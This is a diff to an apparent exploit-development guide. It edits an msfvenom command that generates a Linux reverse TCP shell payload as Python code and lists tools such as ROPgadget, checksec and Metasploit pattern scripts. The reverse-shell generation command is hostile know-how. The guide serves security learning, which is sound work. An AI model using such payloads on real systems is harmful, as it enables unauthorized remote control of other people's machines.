@@ -66,10 +66,10 @@ For your exploit you can usually grab some shellcode from the internet, e.g. [th
      -p linux/x86/shell_reverse_tcp \
      LHOST=$(curl icanhazip.com) \
      LPORT=4444 \
-     -b '\x00\x0a\x0d' \
+     -b '\x00\x09\x0a\x0b\x0c\x0d\x20' \
      -f python
 
-will generate a reverse shell payload without zero bytes or newlines in it and spit it out as ready to use python code.\\
+will generate a reverse shell payload without zero bytes or whitespace in it and spit it out as ready to use python code.\\
 If you need to build a ROP payload, give [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) a try (metasploit has a similar utility called msfrop, but I found ROPgadget to work better most of the times).
 
 Some other useful tools include the [checksec.sh](http://www.trapkit.de/tools/checksec.html) script to quickly check which mitigations are enabled on a binary, the [pattern_create](https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_create.rb) and [pattern_offset](https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_offset.rb) scripts from metasploit to find various important offsets (e.g the offset from the start of a buffer to the saved return address on the stack), as well as the metasm shell (for example to quickly assemble a "jmp short 0x10" to jump over some corrupted part of the shellcode) or nasm (to build your own shellcode).
